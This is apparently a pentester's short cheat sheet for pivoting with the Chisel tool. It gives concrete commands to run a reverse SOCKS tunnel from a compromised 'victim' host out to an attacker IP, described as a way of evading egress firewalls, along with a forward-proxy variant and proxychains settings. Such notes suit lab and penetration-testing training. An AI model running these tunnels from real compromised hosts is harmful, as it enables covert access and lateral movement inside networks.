Chisel
---
# Reverse SOCKS Proxy (Attacker -> Server, Victim -> Client)
---
- Client connects with server
- **Client makes decisions and initiates connection**
- ==Good for **evading egress firewalls** and when **victim can reach the attacker**.==
- On Attacker machine:
	- `chisel server --socks5 --reverse -p <port_number>`
- On Victim machine:
	- `./chisel client --fingerprint <fingerprint_from_server_node> <ip_address>:<server_port> R:socks`
	- `.\chisel_windows.exe client --fingerprint gBlVNGJ8Ki/TR5iAy1+4OAvf8cN8MV+qQV7IVhzT+jA= 10.10.16.34:8080 R:socks`
	- .\chisel.exe client --fingerprint P69UU4bfSlPZdQMJv7KVY120gBrinaSLzim+jSIR0v4= 10.10.16.2:9999 R:socks
 - Foxyproxy setup: (**1080 is default proxy port for reverse connections**)
 - Editing & Confirming proxychains.conf:
	 - `socks5 127.0.0.1 1080`
	 - Port 1080 is default for chisel
	
# Forward SOCKS Proxy (Victim -> Server, Attacker -> Client)
---
- Good when **==victim cannot reach attacker but attacker can==**.
- On Attacker machine:
	- `chisel client <compromised_ip>:<port_on_compromised_ip> <local_port_for_proxy>:socks`
- On Victim machine:
	- `chisel server -p <port_to_open> --socks5`
-  Editing & Confirming proxychains.conf:
	 - `socks5 127.0.0.1 1080`
	 - Port 1080 is default for chisel

- For browser interaction: **proxy by patterns**
- For commands use : **proxychains command**
